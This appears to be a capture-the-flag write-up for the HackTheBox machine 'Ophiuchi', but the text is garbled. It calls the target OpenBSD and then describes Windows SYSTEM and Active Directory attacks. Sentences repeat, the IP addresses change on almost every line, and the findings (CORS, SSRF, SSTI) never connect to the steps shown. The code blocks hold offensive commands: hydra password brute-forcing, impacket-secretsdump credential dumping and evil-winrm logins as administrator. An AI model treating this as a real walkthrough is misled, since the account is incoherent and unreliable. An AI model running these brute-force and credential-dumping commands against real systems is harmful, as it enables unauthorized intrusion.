---
TitleSEO: "HackTheBox — Ophiuchi (Easy OpenBSD) | ZureFX"
TitlePost: "HackTheBox — Ophiuchi (Easy OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Ophiuchi. CORS Misconfiguration and SSRF to achieve easy compromise on OpenBSD."
Keywords: "insane, pwntilldawn, hard, forensics, hackthebox, linux, reversing"
URL: "https://zurefx.github.io/writeups/htb-ophiuchi-459.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-ophiuchi-459/"
Date: "2025-06-05"
Tags: "Insane, PwnTillDawn, Hard, Forensics, HackTheBox, Linux, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-ophiuchi-459"
Permalink: "/writeups/htb-ophiuchi-459.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Ophiuchi** is rated **Easy** on HackTheBox. It runs **OpenBSD** and the IP address during this analysis was `10.64.179.229`.

### Objectives

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.88.122.85/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.127.111.214 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.42.115.140
```

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Service Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target.

```bash
gobuster dir -u http://10.68.138.37/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.240.128 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.33.85.246 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

### SMB Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
evil-winrm -i 10.54.129.169 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p135,389,8080 10.36.55.228 -oN scan.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target. Command injection was possible through unsanitized user input in the search functionality.

## Exploitation

### Vulnerability Identification

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

Key finding: **CORS Misconfiguration**.

Privilege escalation was possible due to misconfigured sudo permissions. Command injection was possible through unsanitized user input in the search functionality.

### Initial Access

The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

```bash
evil-winrm -i 10.104.90.93 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.98.166.210 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Privilege Escalation

### Enumeration

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
evil-winrm -i 10.67.191.95 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory.

```powershell
evil-winrm -i 10.118.235.192 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.52.62.235 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.41.100.9
gobuster dir -u http://10.65.205.199/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

## Summary

### Tools Used

- `enum4linux`
- `pwncat`
- `GetNPUsers`
- `wpscan`
- `mimikatz`
- `crackmapexec`

### Key Takeaways

- CORS Misconfiguration
- SSRF
